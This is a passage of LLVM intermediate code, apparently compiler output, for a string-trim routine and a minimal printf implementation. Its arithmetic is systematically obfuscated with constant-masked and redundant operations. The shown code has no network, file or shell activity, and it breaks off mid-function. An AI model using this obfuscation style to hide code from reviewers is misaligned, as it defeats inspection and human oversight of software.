; <label>:29:                                     ; preds = %44, %28
  %30 = load i32, i32* %5, align 4
  %31 = load i32, i32* %4, align 4
  %32 = icmp sge i32 %30, %31
  br i1 %32, label %33, label %42

; <label>:33:                                     ; preds = %29
  %34 = load i8*, i8** %2, align 8
  %35 = load i32, i32* %5, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds i8, i8* %34, i64 %36
  %38 = load i8, i8* %37, align 1
  %39 = sext i8 %38 to i32
  %40 = call i32 @isspace(i32 %39) #10
  %41 = icmp ne i32 %40, 0
  br label %42

; <label>:42:                                     ; preds = %33, %29
  %43 = phi i1 [ false, %29 ], [ %41, %33 ]
  br i1 %43, label %44, label %51

; <label>:44:                                     ; preds = %42
  %45 = load i32, i32* %5, align 4
  %46 = sub i32 0, %45
  %47 = sub i32 0, -1
  %48 = add i32 %46, %47
  %49 = sub i32 0, %48
  %50 = add nsw i32 %45, -1
  store i32 %49, i32* %5, align 4
  br label %29

; <label>:51:                                     ; preds = %42
  %52 = load i32, i32* %4, align 4
  store i32 %52, i32* %3, align 4
  br label %53

; <label>:53:                                     ; preds = %72, %51
  %54 = load i32, i32* %3, align 4
  %55 = load i32, i32* %5, align 4
  %56 = icmp sle i32 %54, %55
  br i1 %56, label %57, label %77

; <label>:57:                                     ; preds = %53
  %58 = load i8*, i8** %2, align 8
  %59 = load i32, i32* %3, align 4
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds i8, i8* %58, i64 %60
  %62 = load i8, i8* %61, align 1
  %63 = load i8*, i8** %2, align 8
  %64 = load i32, i32* %3, align 4
  %65 = load i32, i32* %4, align 4
  %66 = add i32 %64, -732036518
  %67 = sub i32 %66, %65
  %68 = sub i32 %67, -732036518
  %69 = sub nsw i32 %64, %65
  %70 = sext i32 %68 to i64
  %71 = getelementptr inbounds i8, i8* %63, i64 %70
  store i8 %62, i8* %71, align 1
  br label %72

; <label>:72:                                     ; preds = %57
  %73 = load i32, i32* %3, align 4
  %74 = sub i32 0, 1
  %75 = sub i32 %73, %74
  %76 = add nsw i32 %73, 1
  store i32 %75, i32* %3, align 4
  br label %53

; <label>:77:                                     ; preds = %53
  %78 = load i8*, i8** %2, align 8
  %79 = load i32, i32* %3, align 4
  %80 = load i32, i32* %4, align 4
  %81 = add i32 %79, 1987489171
  %82 = sub i32 %81, %80
  %83 = sub i32 %82, 1987489171
  %84 = sub nsw i32 %79, %80
  %85 = sext i32 %83 to i64
  %86 = getelementptr inbounds i8, i8* %78, i64 %85
  store i8 0, i8* %86, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #1

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #2

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

; <label>:12:                                     ; preds = %333, %3
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %17, label %336

; <label>:17:                                     ; preds = %12
  %18 = load i8*, i8** %5, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 37
  br i1 %21, label %22, label %321

; <label>:22:                                     ; preds = %17
  %23 = load i8*, i8** %5, align 8
  %24 = getelementptr inbounds i8, i8* %23, i32 1
  store i8* %24, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %25 = load i8*, i8** %5, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %22
  br label %336

; <label>:30:                                     ; preds = %22
  %31 = load i8*, i8** %5, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 37
  br i1 %34, label %35, label %36

; <label>:35:                                     ; preds = %30
  br label %322

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %5, align 8
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 45
  br i1 %40, label %41, label %44

; <label>:41:                                     ; preds = %36
  %42 = load i8*, i8** %5, align 8
  %43 = getelementptr inbounds i8, i8* %42, i32 1
  store i8* %43, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %44

; <label>:44:                                     ; preds = %41, %36
  br label %45

; <label>:45:                                     ; preds = %50, %44
  %46 = load i8*, i8** %5, align 8
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 48
  br i1 %49, label %50, label %58

; <label>:50:                                     ; preds = %45
  %51 = load i8*, i8** %5, align 8
  %52 = getelementptr inbounds i8, i8* %51, i32 1
  store i8* %52, i8** %5, align 8
  %53 = load i32, i32* %8, align 4
  %54 = and i32 %53, 2
  %55 = xor i32 %53, 2
  %56 = or i32 %54, %55
  %57 = or i32 %53, 2
  store i32 %56, i32* %8, align 4
  br label %45

; <label>:58:                                     ; preds = %45
  br label %59

; <label>:59:                                     ; preds = %85, %58
  %60 = load i8*, i8** %5, align 8
  %61 = load i8, i8* %60, align 1
  %62 = zext i8 %61 to i32
  %63 = icmp sge i32 %62, 48
  br i1 %63, label %64, label %69

; <label>:64:                                     ; preds = %59
  %65 = load i8*, i8** %5, align 8
  %66 = load i8, i8* %65, align 1
  %67 = zext i8 %66 to i32
  %68 = icmp sle i32 %67, 57
  br label %69

; <label>:69:                                     ; preds = %64, %59
  %70 = phi i1 [ false, %59 ], [ %68, %64 ]
  br i1 %70, label %71, label %88

; <label>:71:                                     ; preds = %69
  %72 = load i32, i32* %7, align 4
  %73 = mul nsw i32 %72, 10
  store i32 %73, i32* %7, align 4
  %74 = load i8*, i8** %5, align 8
  %75 = load i8, i8* %74, align 1
  %76 = zext i8 %75 to i32
  %77 = add i32 %76, -224248815
  %78 = sub i32 %77, 48
  %79 = sub i32 %78, -224248815
  %80 = sub nsw i32 %76, 48
  %81 = load i32, i32* %7, align 4
  %82 = sub i32 0, %79
  %83 = sub i32 %81, %82
  %84 = add nsw i32 %81, %79
  store i32 %83, i32* %7, align 4
  br label %85

; <label>:85:                                     ; preds = %71
  %86 = load i8*, i8** %5, align 8
  %87 = getelementptr inbounds i8, i8* %86, i32 1
  store i8* %87, i8** %5, align 8
  br label %59

; <label>:88:                                     ; preds = %69
  %89 = load i8*, i8** %5, align 8
  %90 = load i8, i8* %89, align 1
  %91 = zext i8 %90 to i32
  %92 = icmp eq i32 %91, 115
  br i1 %92, label %93, label %134

; <label>:93:                                     ; preds = %88
  %94 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %95 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %94, i32 0, i32 0
  %96 = load i32, i32* %95, align 8
  %97 = icmp ule i32 %96, 40
  br i1 %97, label %98, label %107

; <label>:98:                                     ; preds = %93
  %99 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %94, i32 0, i32 3
  %100 = load i8*, i8** %99, align 8
  %101 = getelementptr i8, i8* %100, i32 %96
  %102 = bitcast i8* %101 to i32*
  %103 = add i32 %96, 812991415
  %104 = add i32 %103, 8
  %105 = sub i32 %104, 812991415
  %106 = add i32 %96, 8
  store i32 %105, i32* %95, align 8
  br label %112

; <label>:107:                                    ; preds = %93
  %108 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %94, i32 0, i32 2
  %109 = load i8*, i8** %108, align 8
  %110 = bitcast i8* %109 to i32*
  %111 = getelementptr i8, i8* %109, i32 8
  store i8* %111, i8** %108, align 8
  br label %112

; <label>:112:                                    ; preds = %107, %98
  %113 = phi i32* [ %102, %98 ], [ %110, %107 ]
  %114 = load i32, i32* %113, align 4
  %115 = sext i32 %114 to i64
  %116 = inttoptr i64 %115 to i8*
  store i8* %116, i8** %11, align 8
  %117 = load i8**, i8*** %4, align 8
  %118 = load i8*, i8** %11, align 8
  %119 = icmp ne i8* %118, null
  br i1 %119, label %120, label %122

; <label>:120:                                    ; preds = %112
  %121 = load i8*, i8** %11, align 8
  br label %123

; <label>:122:                                    ; preds = %112
  br label %123

; <label>:123:                                    ; preds = %122, %120
  %124 = phi i8* [ %121, %120 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.127, i32 0, i32 0), %122 ]
  %125 = load i32, i32* %7, align 4
  %126 = load i32, i32* %8, align 4
  %127 = call i32 @prints(i8** %117, i8* %124, i32 %125, i32 %126)
  %128 = load i32, i32* %9, align 4
  %129 = sub i32 0, %128
  %130 = sub i32 0, %127
  %131 = add i32 %129, %130
  %132 = sub i32 0, %131
  %133 = add nsw i32 %128, %127
  store i32 %132, i32* %9, align 4
  br label %333

; <label>:134:                                    ; preds = %88
  %135 = load i8*, i8** %5, align 8
  %136 = load i8, i8* %135, align 1
  %137 = zext i8 %136 to i32
  %138 = icmp eq i32 %137, 100
  br i1 %138, label %139, label %170

; <label>:139:                                    ; preds = %134
  %140 = load i8**, i8*** %4, align 8
  %141 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %142 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %141, i32 0, i32 0
  %143 = load i32, i32* %142, align 8
  %144 = icmp ule i32 %143, 40
  br i1 %144, label %145, label %154

; <label>:145:                                    ; preds = %139
  %146 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %141, i32 0, i32 3
  %147 = load i8*, i8** %146, align 8
  %148 = getelementptr i8, i8* %147, i32 %143
  %149 = bitcast i8* %148 to i32*
  %150 = add i32 %143, 1023676492
  %151 = add i32 %150, 8
  %152 = sub i32 %151, 1023676492
  %153 = add i32 %143, 8
  store i32 %152, i32* %142, align 8
  br label %159

; <label>:154:                                    ; preds = %139
  %155 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %141, i32 0, i32 2
  %156 = load i8*, i8** %155, align 8
  %157 = bitcast i8* %156 to i32*
  %158 = getelementptr i8, i8* %156, i32 8
  store i8* %158, i8** %155, align 8
  br label %159

; <label>:159:                                    ; preds = %154, %145
  %160 = phi i32* [ %149, %145 ], [ %157, %154 ]
  %161 = load i32, i32* %160, align 4
  %162 = load i32, i32* %7, align 4
  %163 = load i32, i32* %8, align 4
  %164 = call i32 @printi(i8** %140, i32 %161, i32 10, i32 1, i32 %162, i32 %163, i32 97)
  %165 = load i32, i32* %9, align 4
  %166 = sub i32 %165, -1535108584
  %167 = add i32 %166, %164
  %168 = add i32 %167, -1535108584
  %169 = add nsw i32 %165, %164
  store i32 %168, i32* %9, align 4
  br label %333

; <label>:170:                                    ; preds = %134
  %171 = load i8*, i8** %5, align 8
  %172 = load i8, i8* %171, align 1
  %173 = zext i8 %172 to i32
  %174 = icmp eq i32 %173, 120
  br i1 %174, label %175, label %207

; <label>:175:                                    ; preds = %170
  %176 = load i8**, i8*** %4, align 8
  %177 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %178 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %177, i32 0, i32 0
  %179 = load i32, i32* %178, align 8
  %180 = icmp ule i32 %179, 40
  br i1 %180, label %181, label %191

; <label>:181:                                    ; preds = %175
  %182 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %177, i32 0, i32 3
  %183 = load i8*, i8** %182, align 8
  %184 = getelementptr i8, i8* %183, i32 %179
  %185 = bitcast i8* %184 to i32*
  %186 = sub i32 0, %179
  %187 = sub i32 0, 8
  %188 = add i32 %186, %187
  %189 = sub i32 0, %188
  %190 = add i32 %179, 8
  store i32 %189, i32* %178, align 8
  br label %196

; <label>:191:                                    ; preds = %175
  %192 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %177, i32 0, i32 2
  %193 = load i8*, i8** %192, align 8
  %194 = bitcast i8* %193 to i32*
  %195 = getelementptr i8, i8* %193, i32 8
  store i8* %195, i8** %192, align 8
  br label %196

; <label>:196:                                    ; preds = %191, %181
  %197 = phi i32* [ %185, %181 ], [ %194, %191 ]
  %198 = load i32, i32* %197, align 4
  %199 = load i32, i32* %7, align 4
  %200 = load i32, i32* %8, align 4
  %201 = call i32 @printi(i8** %176, i32 %198, i32 16, i32 0, i32 %199, i32 %200, i32 97)
  %202 = load i32, i32* %9, align 4
  %203 = add i32 %202, 347299007
  %204 = add i32 %203, %201
  %205 = sub i32 %204, 347299007
  %206 = add nsw i32 %202, %201
  store i32 %205, i32* %9, align 4
  br label %333

; <label>:207:                                    ; preds = %170
  %208 = load i8*, i8** %5, align 8
  %209 = load i8, i8* %208, align 1
  %210 = zext i8 %209 to i32
  %211 = icmp eq i32 %210, 88
  br i1 %211, label %212, label %244

; <label>:212:                                    ; preds = %207
  %213 = load i8**, i8*** %4, align 8
  %214 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %215 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %214, i32 0, i32 0
  %216 = load i32, i32* %215, align 8
  %217 = icmp ule i32 %216, 40
  br i1 %217, label %218, label %227

; <label>:218:                                    ; preds = %212
  %219 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %214, i32 0, i32 3
  %220 = load i8*, i8** %219, align 8
  %221 = getelementptr i8, i8* %220, i32 %216
  %222 = bitcast i8* %221 to i32*
  %223 = add i32 %216, -975756482
  %224 = add i32 %223, 8
  %225 = sub i32 %224, -975756482
  %226 = add i32 %216, 8
  store i32 %225, i32* %215, align 8
  br label %232

; <label>:227:                                    ; preds = %212
  %228 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %214, i32 0, i32 2
  %229 = load i8*, i8** %228, align 8
  %230 = bitcast i8* %229 to i32*
  %231 = getelementptr i8, i8* %229, i32 8
  store i8* %231, i8** %228, align 8
  br label %232

; <label>:232:                                    ; preds = %227, %218
  %233 = phi i32* [ %222, %218 ], [ %230, %227 ]
  %234 = load i32, i32* %233, align 4
  %235 = load i32, i32* %7, align 4
  %236 = load i32, i32* %8, align 4
  %237 = call i32 @printi(i8** %213, i32 %234, i32 16, i32 0, i32 %235, i32 %236, i32 65)
  %238 = load i32, i32* %9, align 4
  %239 = sub i32 0, %238
  %240 = sub i32 0, %237
  %241 = add i32 %239, %240
  %242 = sub i32 0, %241
  %243 = add nsw i32 %238, %237
  store i32 %242, i32* %9, align 4
  br label %333

; <label>:244:                                    ; preds = %207
  %245 = load i8*, i8** %5, align 8
  %246 = load i8, i8* %245, align 1
  %247 = zext i8 %246 to i32
  %248 = icmp eq i32 %247, 117
  br i1 %248, label %249, label %280

; <label>:249:                                    ; preds = %244
  %250 = load i8**, i8*** %4, align 8
  %251 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %252 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %251, i32 0, i32 0
  %253 = load i32, i32* %252, align 8
  %254 = icmp ule i32 %253, 40
  br i1 %254, label %255, label %263

; <label>:255:                                    ; preds = %249
  %256 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %251, i32 0, i32 3
  %257 = load i8*, i8** %256, align 8
  %258 = getelementptr i8, i8* %257, i32 %253
  %259 = bitcast i8* %258 to i32*
  %260 = sub i32 0, 8
  %261 = sub i32 %253, %260
  %262 = add i32 %253, 8
  store i32 %261, i32* %252, align 8
  br label %268

; <label>:263:                                    ; preds = %249
  %264 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %251, i32 0, i32 2
  %265 = load i8*, i8** %264, align 8
  %266 = bitcast i8* %265 to i32*
  %267 = getelementptr i8, i8* %265, i32 8
  store i8* %267, i8** %264, align 8
  br label %268

; <label>:268:                                    ; preds = %263, %255
  %269 = phi i32* [ %259, %255 ], [ %266, %263 ]
  %270 = load i32, i32* %269, align 4
  %271 = load i32, i32* %7, align 4
  %272 = load i32, i32* %8, align 4
  %273 = call i32 @printi(i8** %250, i32 %270, i32 10, i32 0, i32 %271, i32 %272, i32 97)
  %274 = load i32, i32* %9, align 4
  %275 = sub i32 0, %274
  %276 = sub i32 0, %273
  %277 = add i32 %275, %276
  %278 = sub i32 0, %277
  %279 = add nsw i32 %274, %273
  store i32 %278, i32* %9, align 4
  br label %333

; <label>:280:                                    ; preds = %244
  %281 = load i8*, i8** %5, align 8
  %282 = load i8, i8* %281, align 1
  %283 = zext i8 %282 to i32
  %284 = icmp eq i32 %283, 99
  br i1 %284, label %285, label %320

; <label>:285:                                    ; preds = %280
  %286 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %287 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %286, i32 0, i32 0
  %288 = load i32, i32* %287, align 8
  %289 = icmp ule i32 %288, 40
  br i1 %289, label %290, label %299

; <label>:290:                                    ; preds = %285
  %291 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %286, i32 0, i32 3
  %292 = load i8*, i8** %291, align 8
  %293 = getelementptr i8, i8* %292, i32 %288
  %294 = bitcast i8* %293 to i32*
  %295 = add i32 %288, -431779846
  %296 = add i32 %295, 8
  %297 = sub i32 %296, -431779846
  %298 = add i32 %288, 8
  store i32 %297, i32* %287, align 8
  br label %304

; <label>:299:                                    ; preds = %285
  %300 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %286, i32 0, i32 2
  %301 = load i8*, i8** %300, align 8
  %302 = bitcast i8* %301 to i32*
  %303 = getelementptr i8, i8* %301, i32 8
  store i8* %303, i8** %300, align 8
  br label %304

; <label>:304:                                    ; preds = %299, %290
  %305 = phi i32* [ %294, %290 ], [ %302, %299 ]
  %306 = load i32, i32* %305, align 4
  %307 = trunc i32 %306 to i8
  %308 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %307, i8* %308, align 1
  %309 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %309, align 1
  %310 = load i8**, i8*** %4, align 8
  %311 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %312 = load i32, i32* %7, align 4
  %313 = load i32, i32* %8, align 4
  %314 = call i32 @prints(i8** %310, i8* %311, i32 %312, i32 %313)
  %315 = load i32, i32* %9, align 4
  %316 = sub i32 %315, -476766058
  %317 = add i32 %316, %314
  %318 = add i32 %317, -476766058
  %319 = add nsw i32 %315, %314
  store i32 %318, i32* %9, align 4
  br label %333

; <label>:320:                                    ; preds = %280
  br label %332

; <label>:321:                                    ; preds = %17
  br label %322

; <label>:322:                                    ; preds = %321, %35
  %323 = load i8**, i8*** %4, align 8
  %324 = load i8*, i8** %5, align 8
  %325 = load i8, i8* %324, align 1
  %326 = zext i8 %325 to i32
  call void @printchar(i8** %323, i32 %326)
  %327 = load i32, i32* %9, align 4
  %328 = add i32 %327, -166440373
  %329 = add i32 %328, 1
  %330 = sub i32 %329, -166440373
  %331 = add nsw i32 %327, 1
  store i32 %330, i32* %9, align 4
  br label %332

; <label>:332:                                    ; preds = %322, %320
  br label %333

; <label>:333:                                    ; preds = %332, %304, %268, %232, %196, %159, %123
  %334 = load i8*, i8** %5, align 8
  %335 = getelementptr inbounds i8, i8* %334, i32 1
  store i8* %335, i8** %5, align 8
  br label %12

; <label>:336:                                    ; preds = %29, %12
  %337 = load i8**, i8*** %4, align 8
  %338 = icmp ne i8** %337, null
  br i1 %338, label %339, label %342

; <label>:339:                                    ; preds = %336
  %340 = load i8**, i8*** %4, align 8
  %341 = load i8*, i8** %340, align 8
  store i8 0, i8* %341, align 1
  br label %342

; <label>:342:                                    ; preds = %339, %336
  %343 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %344 = bitcast %struct.__va_list_tag* %343 to i8*
  call void @llvm.va_end(i8* %344)
  %345 = load i32, i32* %9, align 4
  ret i32 %345
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %51

; <label>:15:                                     ; preds = %4
  store i32 0, i32* %11, align 4
  %16 = load i8*, i8** %6, align 8
  store i8* %16, i8** %12, align 8
  br label %17

; <label>:17:                                     ; preds = %27, %15
  %18 = load i8*, i8** %12, align 8
  %19 = load i8, i8* %18, align 1
  %20 = icmp ne i8 %19, 0
  br i1 %20, label %21, label %30

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* %11, align 4
  %23 = sub i32 %22, -729917755
  %24 = add i32 %23, 1
  %25 = add i32 %24, -729917755
  %26 = add nsw i32 %22, 1
  store i32 %25, i32* %11, align 4
  br label %27

; <label>:27:                                     ; preds = %21
  %28 = load i8*, i8** %12, align 8
  %29 = getelementptr inbounds i8, i8* %28, i32 1
  store i8* %29, i8** %12, align 8
  br label %17

; <label>:30:                                     ; preds = %17
  %31 = load i32, i32* %11, align 4
  %32 = load i32, i32* %7, align 4
  %33 = icmp sge i32 %31, %32
  br i1 %33, label %34, label %35

; <label>:34:                                     ; preds = %30
  store i32 0, i32* %7, align 4
  br label %42

; <label>:35:                                     ; preds = %30
  %36 = load i32, i32* %11, align 4
  %37 = load i32, i32* %7, align 4
  %38 = add i32 %37, -146359519
  %39 = sub i32 %38, %36
  %40 = sub i32 %39, -146359519
  %41 = sub nsw i32 %37, %36
  store i32 %40, i32* %7, align 4
  br label %42

; <label>:42:                                     ; preds = %35, %34
  %43 = load i32, i32* %8, align 4
  %44 = xor i32 2, -1
  %45 = xor i32 %43, %44
  %46 = and i32 %45, %43
  %47 = and i32 %43, 2
  %48 = icmp ne i32 %46, 0
  br i1 %48, label %49, label %50

; <label>:49:                                     ; preds = %42
  store i32 48, i32* %10, align 4
  br label %50

; <label>:50:                                     ; preds = %49, %42
  br label %51

; <label>:51:                                     ; preds = %50, %4
  %52 = load i32, i32* %8, align 4
  %53 = xor i32 %52, -1
  %54 = xor i32 1, -1
  %55 = xor i32 -1766420212, -1
  %56 = or i32 %53, %54
  %57 = or i32 -1766420212, %55
  %58 = xor i32 %56, -1
  %59 = and i32 %58, %57
  %60 = and i32 %52, 1
  %61 = icmp ne i32 %59, 0
  br i1 %61, label %79, label %62

; <label>:62:                                     ; preds = %51
  br label %63

; <label>:63:                                     ; preds = %73, %62
  %64 = load i32, i32* %7, align 4
  %65 = icmp sgt i32 %64, 0
  br i1 %65, label %66, label %78

; <label>:66:                                     ; preds = %63
  %67 = load i8**, i8*** %5, align 8
  %68 = load i32, i32* %10, align 4
  call void @printchar(i8** %67, i32 %68)
  %69 = load i32, i32* %9, align 4
  %70 = sub i32 0, 1
  %71 = sub i32 %69, %70
  %72 = add nsw i32 %69, 1
  store i32 %71, i32* %9, align 4
  br label %73

; <label>:73:                                     ; preds = %66
  %74 = load i32, i32* %7, align 4
  %75 = sub i32 0, -1
  %76 = sub i32 %74, %75
  %77 = add nsw i32 %74, -1
  store i32 %76, i32* %7, align 4
  br label %63

; <label>:78:                                     ; preds = %63
  br label %79

; <label>:79:                                     ; preds = %78, %51
  br label %80

; <label>:80:                                     ; preds = %95, %79
  %81 = load i8*, i8** %6, align 8
  %82 = load i8, i8* %81, align 1
  %83 = icmp ne i8 %82, 0
  br i1 %83, label %84, label %98

; <label>:84:                                     ; preds = %80
  %85 = load i8**, i8*** %5, align 8
  %86 = load i8*, i8** %6, align 8
  %87 = load i8, i8* %86, align 1
  %88 = zext i8 %87 to i32
  call void @printchar(i8** %85, i32 %88)
  %89 = load i32, i32* %9, align 4
  %90 = sub i32 0, %89
  %91 = sub i32 0, 1
  %92 = add i32 %90, %91
  %93 = sub i32 0, %92
  %94 = add nsw i32 %89, 1
  store i32 %93, i32* %9, align 4
  br label %95

; <label>:95:                                     ; preds = %84
  %96 = load i8*, i8** %6, align 8
  %97 = getelementptr inbounds i8, i8* %96, i32 1
  store i8* %97, i8** %6, align 8
  br label %80

; <label>:98:                                     ; preds = %80
  br label %99

; <label>:99:                                     ; preds = %110, %98
  %100 = load i32, i32* %7, align 4
  %101 = icmp sgt i32 %100, 0
  br i1 %101, label %102, label %115

; <label>:102:                                    ; preds = %99
  %103 = load i8**, i8*** %5, align 8
  %104 = load i32, i32* %10, align 4
  call void @printchar(i8** %103, i32 %104)
  %105 = load i32, i32* %9, align 4
  %106 = sub i32 %105, 877279117
  %107 = add i32 %106, 1
  %108 = add i32 %107, 877279117
  %109 = add nsw i32 %105, 1
  store i32 %108, i32* %9, align 4
  br label %110

; <label>:110:                                    ; preds = %102
  %111 = load i32, i32* %7, align 4
  %112 = sub i32 0, -1
  %113 = sub i32 %111, %112
  %114 = add nsw i32 %111, -1
  store i32 %113, i32* %7, align 4
  br label %99

; <label>:115:                                    ; preds = %99
  %116 = load i32, i32* %9, align 4
  ret i32 %116
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

; <label>:25:                                     ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** %28, i8* %29, i32 %30, i32 %31)
  store i32 %32, i32* %8, align 4
  br label %131

; <label>:33:                                     ; preds = %7
  %34 = load i32, i32* %12, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %47

; <label>:36:                                     ; preds = %33
  %37 = load i32, i32* %11, align 4
  %38 = icmp eq i32 %37, 10
  br i1 %38, label %39, label %47

; <label>:39:                                     ; preds = %36
  %40 = load i32, i32* %10, align 4
  %41 = icmp slt i32 %40, 0
  br i1 %41, label %42, label %47

; <label>:42:                                     ; preds = %39
  store i32 1, i32* %19, align 4
  %43 = load i32, i32* %10, align 4
  %44 = sub i32 0, %43
  %45 = add i32 0, %44
  %46 = sub nsw i32 0, %43
  store i32 %45, i32* %21, align 4
  br label %47

; <label>:47:                                     ; preds = %42, %39, %36, %33
  %48 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %49 = getelementptr inbounds i8, i8* %48, i64 12
  %50 = getelementptr inbounds i8, i8* %49, i64 -1
  store i8* %50, i8** %17, align 8
  %51 = load i8*, i8** %17, align 8
  store i8 0, i8* %51, align 1
  br label %52

; <label>:52:                                     ; preds = %75, %47
  %53 = load i32, i32* %21, align 4
  %54 = icmp ne i32 %53, 0
  br i1 %54, label %55, label %86

; <label>:55:                                     ; preds = %52
  %56 = load i32, i32* %21, align 4
  %57 = load i32, i32* %11, align 4
  %58 = urem i32 %56, %57
  store i32 %58, i32* %18, align 4
  %59 = load i32, i32* %18, align 4
  %60 = icmp sge i32 %59, 10
  br i1 %60, label %61, label %75

; <label>:61:                                     ; preds = %55
  %62 = load i32, i32* %15, align 4
  %63 = sub i32 %62, 1156220805
